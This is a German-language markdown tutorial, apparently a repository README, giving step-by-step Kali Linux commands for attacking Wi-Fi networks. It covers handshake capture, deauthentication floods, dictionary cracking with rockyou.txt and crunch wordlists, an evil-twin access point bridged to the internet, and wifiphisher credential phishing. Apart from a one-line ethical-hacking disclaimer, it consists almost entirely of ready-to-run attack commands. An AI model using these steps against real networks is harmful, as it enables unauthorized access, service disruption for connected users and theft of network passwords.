# Network Hacking


# 1. WLAN Passwörter hacken



### WICHTIG:
- Bei den Bezeichnungen der WLAN-Module kann es zu Abweichungen kommen.

- `mon` steht für den `Monitor-Mode`, daher wird in diesem Fall bei den Befehlen immer `Wlan0mon` NACH DER AKTIVIERUNG DES MONITOR-MODUS verwendet !

- Es ist nicht zwingend notwendig, Kali Linux zu nutzen, allerdings sind bei Kali Linux die notwendigen Programme bereits vorinstalliert.

- `für diese Anleitung genutztes Betriebssystem: Kali Linux`


### Disclaimer
Die folgenden Informationen sind nur für Ethical Hacking !
Das Ausführen von Angriffen auf fremde Systeme ist ohne ausdrückliche Erlaubnis, illegal !!!





## A. Monitor-Mode

```
$ ifconfig
```
```
$ iwconfig
```
```
$ sudo airmon-ng check
```
```
$ sudo airmon-ng check kill
```
```
$ sudo airmon-ng start wlan0
```


----------------------------------------------------------------------------------------------------------------


## B. Ordner anlegen

In einem beliebigen Verzeichnis (z.B. ~ Dokumente) einen Ordner anlegen und das Terminal in diesem Ordner öffnen.
Somit werden alle Dateien automatisch in diesem Ordner gespeichert.


---------------------------------------------------------------------------------


## C. Ziel auswählen & Pakete abfangen
```
$ sudo airodump-ng wlan0mon
```

- So würde ein gewünschter Output aussehen:

		
		SSID	AUTH		ENC		CH	BSSID (MAC)	MB

		Name	Verifizierung	z.B.WPA2	Zahl	MAC-Aresse	Zahl
		


- mit `STRG+C` beenden


- Mit diesem Befehl kann ein bestimmtes WLAN beobachtet werden:
```
$ sudo airodump-ng wlan0mon -d *HIER DIE MAC-ADRESSE DES WLAN-ROUTERS*
```


- Nun muss ein belibiges Gerät mit dem WLAN verbunden werden, damit Pakete übertragen werden:
(Es sollte eine Packetanzahl unter dem Punkt "Lost" zu sehen sein, während des Aufbauens einer WLAN-Verbindung.)
```
$ sudo airodump-ng -w hack1 -c 1 --bssid *HIER DIE MAC-ADRESSE DES WLAN-ROUTERS* wlan0mon
```


- Optional: Um zu erzwingen, dass sich Geräte mit dem WLAN-ROUTER neu verbinden müssen:
```
$ sudo aireplay-ng --deauth 0 -a *HIER DIE MAC-ADRESSE DES WLAN-ROUTERS* wlan0mon
```


- Wenn alles korrekt funktioniert hat und richtig ausgeführt wurde, sollten nun die Pakete abgefangen sein und das Passwort kann ermittelt werden.


----------------------------------------------------------------------------------------------------------------


## D. [Wireshark](https://www.wireshark.org/)

In dem eigen angelegten Ordner:

```
$ ls
```
```
$ wireshark hack1-01.cap
```


----------------------------------------------------------------------------------------------------------------


## E. stop monitor mode

```
$ iwconfig
```
```
$ sudo airmon-ng stop wlan0mon
```

- Sollte nach dem Deaktivieren keine Möglichkeit mehr bestehen, sich mit einem WLAN zu verbinden, muss das Gerät ggf. neu gestartet werden.



## F. unzip `rockyou.txt.gz` in dem wordlist-Verzeichnis von Kali Linux

```
$ locate rockyou
```
```
$ cd [hier das Verzeichnis]
```
```
$ sudo gzip -d rockyou.txt.gz
```
```
$ ls
```
```
$ aircrack-ng hack1-01.cap -w rockyou.txt
```

- Nun wird das Passwort ermittelt. Je nach Stärke & Länge des Passwortes und der Leistung des PCs kann die dafür benötigte Zeit abweichen.


----------------------------------------------------------------------------------------------------------------


# 2. Wordlist - [Crunch](https://www.kali.org/tools/crunch/)


### Erstellen einer eigenen Wordlist (hilfreich, wenn z.B. Länge und/oder die verwendeten Zeichen bekannt sind)


Optional kann auch eine `eigene Wordlist` angelegt werden, wenn z.B. bekannt ist, wie viele Zeichen min./max. und welche Zeichen genutzt werden. In diesem Beispiel würde mit diesem Befehl eine Worlist erstellt werden, wo jedes Passwort `9 Zeichen` lang ist und aus den Buchstaben `abc` besteht.

__Hinweis__:
Die `Dauer` sowie der `benötigte Speicherplatz` bei der Erstellung der Wordlist kann je nach Anzahl der Optionen (Länge, verwendete Buchstaben etc.) abweichen, hier also sicherstellen, dass genügend Speicher vorhanden ist.

```
$ crunch 9 9 abc -o wordlist-abc.lst
```

Den Handshake mit der eigenen Wordlist ausführen:
```
$ aircrack-ng hack1-01.cap -w wordlist-abc.lst
```



----------------------------------------------------------------------------------------------------------------



# 3. WLAN mit einem Evil Twin hacken in Kali Linux


## Einen Evil Twin erstellen, um ein Netzwerk aufzusetzen, bei dem der PC vorgibt, der WLAN-Router zu sein.


```
$ sudo apt install bridge-utils
```


- Nun muss der WLAN-Adapter in Monitor-mode:

```
$ iwconfig
```
```
$ sudo airmon-ng check
```
```
$ sudo airmon-ng check kill
```
```
$ sudo airmon-ng start wlan0
```
```
$ iwconfig
```


- Netzwerk "fälschen":

Hinweis:

Signal von dem gefälschten Netzwerk ist natürlich deutlich schwächer. Hier muss ggf. nachgeholfen werden.

```
$ sudo airodump-ng wlan0mon
```
```
$ airbase-ng -a *mac-adresse(meist als "BSSID" gekennzeichnet)* --essid *SSID(Name)* -c *CHANNEL (z.B.1)* wlan0mon
```

### WICHTIG:
Wenn bei der SSID Leerzeichen sind, dann muss ein `\` vor das Leerzeichen gesetzt werden.

- Der Evil Twin ist jetzt gestartet, allerdings wird noch keine Internetverbindung zur Verfügung gestellt!


- Neues Terminal Fenster öffnen:
```
$aireplay-ng --deauth 100 -a *BSSID* wlan0mon
```

(100 = Anzahl der Aufforderung sich nicht mit dem originalen Netzwerk zu verbinden.)


- Internetzugriff schaffen:
```
$ iwconfig
```
```
$ sudo brctl addbr evil
```
```
$ sudo brctl addif evil eth0 	(eth0 = die erste neue verbindung, die bei iwconfig angezeigt wird)
```
```
$ iwconfig (nun müsste auch ein "evil" zu sehen sein)
```


- "evil" mit "at0" verbinden & IP einstellen:
```
$ sudo brctl addif evil at0
```
```
$ sudo ifconfig eth0 0.0.0.0 up
```
```
$ sudo ifconfig at0 0.0.0.0 up
```
```
$ sudo ifconfig evil up
```

```
$ sudo dhclient evil oder $ sudo dhclient3 evil (ausprobieren welches funktioniert)
```

- Client (Handy, Tablet, PC, etc.) verbinden, um Pakete zu senden und erfologreich sein zu können.


----------------------------------------------------------------------------------------------------------------


## stop monitor mode:

```
$ iwconfig
```
```
$ sudo airmon-ng stop wlan0mon
```

- Sollte nach dem Deaktivieren keine Möglichkeit mehr bestehen, sich mit einem WLAN zu verbinden, muss das Gerät ggf. neu gestartet werden.


----------------------------------------------------------------------------------------------------------------


### 4. [wifiphisher](https://github.com/wifiphisher/wifiphisher)

Das Tool `wifiphisher` erstellt quasi einen `evil Twin`. Das Tool kopiert Netzwerke und wenn ein Opfer versucht,
sich mit einem geklonten Netzwerk zu verbinden, wird das Opfer nach der Eingabe des Passwortes gebeten.
Das Passwort wird dann sofort übertragen.


Es wird ein WLAN Adapter benötigt, der den `Monitor Mode` unterstützt.


```
$ sudo apt install wifiphisher
```
```
$ wifiphisher -h
```
```
$ ifconfig
```
```
$ iwconfig
```
```
$ sudo wifiphisher -i wlan0 -e WLAN-SSID
```

- Eine der 4 Optionen auswählen.
- Mit den Pfeiltasten, kann zwischen den 4 Optionen gewählt werden.


----------------------------------------------------------------------------------------------------------------
